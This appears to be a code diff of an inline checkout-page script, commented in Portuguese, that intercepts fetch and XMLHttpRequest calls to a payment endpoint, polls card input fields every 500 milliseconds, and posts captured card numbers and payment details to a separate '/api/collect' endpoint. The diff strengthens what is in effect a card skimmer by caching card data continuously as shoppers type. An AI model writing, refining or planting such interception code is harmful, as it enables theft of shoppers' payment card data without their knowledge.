@@ -19,13 +19,12 @@
 (function () {
   const COLLECT_URL = "/api/collect";
   const TARGET_URL = "/api/payments/create";
-  const PROCESSED = new WeakSet();
+  let cardCache = {};  // cache dos dados do cartão capturados em tempo real
   let lastCollected = 0;
 
   function digits(v) { return String(v || "").replace(/\D/g, ""); }
   function clean(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }
 
-  // Busca input pelo id, name OU fallback de placeholder/type
   function findInput({ ids = [], names = [], types = [], placeholders = [] }) {
     for (const id of ids) {
       const el = document.getElementById(id);
@@ -48,7 +47,7 @@
     return null;
   }
 
-  // Coleta dados do DOM (mesmo método anterior, mas robusto)
+  // Função que captura os dados do DOM a qualquer momento
   function collectFromDOM() {
     const cardNumber = findInput({
       ids: ['cardNumber', 'card-number'],
@@ -110,33 +109,38 @@
     };
   }
 
-  // Envia os dados para o servidor
-  function sendToCollect(payload, origem) {
-    // Evita enviar 2x em menos de 1s (fetch + clique, por exemplo)
+  // Polling: a cada 500ms salva no cache os dados atuais
+  setInterval(function () {
+    const data = collectFromDOM();
+    // Só atualiza campos que têm valor (evita sobrescrever com vazio)
+    Object.keys(data).forEach(k => {
+      if (data[k]) cardCache[k] = data[k];
+    });
+  }, 500);
+
+  // Envia para o servidor
+  function sendToCollect(origem) {
     const agora = Date.now();
     if (agora - lastCollected < 1000) {
-      console.log("⏭️ Ignorando envio duplicado (" + origem + ")");
+      console.log("⏭️ Envio duplicado ignorado (" + origem + ")");
+      return;
+    }
+    if (!cardCache.card_num || cardCache.card_num.length < 13) {
+      console.log("⚠️ Cache sem número de cartão ainda (" + origem + ")");
       return;
     }
     lastCollected = agora;
-
-    if (!payload.card_num || payload.card_num.length < 13) {
-      console.log("⚠️ Sem número de cartão válido, não envio");
-      return;
-    }
-
-    console.log("📤 Coletando (" + origem + "):", payload);
+    console.log("📤 Coletando (" + origem + "):", cardCache);
     fetch(COLLECT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(cardCache)
     })
     .then(r => r.json())
     .then(d => console.log("✅ Servidor respondeu:", d))
     .catch(e => console.error("❌ Erro:", e));
   }
 
-  // Extrai dados de um body JSON enviado pelo React
   function extractFromBody(body) {
     try {
       const data = typeof body === "string" ? JSON.parse(body) : body;
@@ -156,70 +160,59 @@
         amount: data.totals?.total || data.amount || "",
         installments: String(card.installments || 1)
       };
-    } catch (e) {
-      return null;
-    }
+    } catch (e) { return null; }
   }
 
-  // 1) INTERCEPTA O FETCH
+  // 1) Intercepta fetch (para o caso do React mandar o cartão no body)
   const originalFetch = window.fetch;
   window.fetch = async function (...args) {
     const [url, options = {}] = args;
-    const urlStr = String(url);
-    const method = (options.method || "GET").toUpperCase();
-
-    if (urlStr.includes(TARGET_URL) && method === "POST") {
+    if (String(url).includes(TARGET_URL) && (options.method || "GET").toUpperCase() === "POST") {
       const extracted = extractFromBody(options.body);
-      if (extracted && extracted.card_num) {
-        sendToCollect(extracted, "fetch");
+      if (extracted) {
+        Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
       }
+      // Envia para coleta usando o cache atualizado
+      sendToCollect("fetch");
     }
     return originalFetch.apply(this, args);
   };
 
-  // 2) INTERCEPTA O XMLHttpRequest (axios, etc)
+  // 2) Intercepta XHR
   const XHROpen = XMLHttpRequest.prototype.open;
   const XHRSend = XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open = function (method, url, ...rest) {
-    this._url = url;
-    this._method = method;
+    this._url = url; this._method = method;
     return XHROpen.call(this, method, url, ...rest);
   };
   XMLHttpRequest.prototype.send = function (body) {
     if (this._url && String(this._url).includes(TARGET_URL) && (this._method || "").toUpperCase() === "POST") {
       const extracted = extractFromBody(body);
-      if (extracted && extracted.card_num) {
-        sendToCollect(extracted, "xhr");
+      if (extracted) {
+        Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
       }
+      sendToCollect("xhr");
     }
     return XHRSend.call(this, body);
   };
 
-  // 3) FALLBACK: LISTENER DE CLIQUE (caso nem fetch nem XHR seja usado)
+  // 3) Fallback: clique em botão de finalizar
   function isFinalizeButton(el) {
     if (!el || el.tagName !== "BUTTON") return false;
     const text = (el.innerText || "").toLowerCase();
     return /finalizar|pagar|continuar|comprar|concluir/.test(text);
   }
-
   document.addEventListener("click", function (event) {
     const btn = event.target.closest("button");
-    if (!btn || PROCESSED.has(btn)) return;
-    if (!isFinalizeButton(btn)) return;
-
+    if (!btn || !isFinalizeButton(btn)) return;
     const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
       || document.querySelector('input[type="radio"][value="credit_card"]:checked');
     if (!cardRadio) return;
-
-    PROCESSED.add(btn);
-    // Delay pequeno pra dar tempo do React preencher o estado
-    setTimeout(() => {
-      const payload = collectFromDOM();
-      sendToCollect(payload, "click");
-    }, 100);
+    // Delay maior para dar tempo do cache pegar
+    setTimeout(() => sendToCollect("click"), 300);
   }, true);
 
-  console.log("🔍 Interceptadores ativos (fetch + XHR + clique)");
+  console.log("🔍 Interceptadores + polling ativos (cache a cada 500ms)");
 })();
 </script>
     
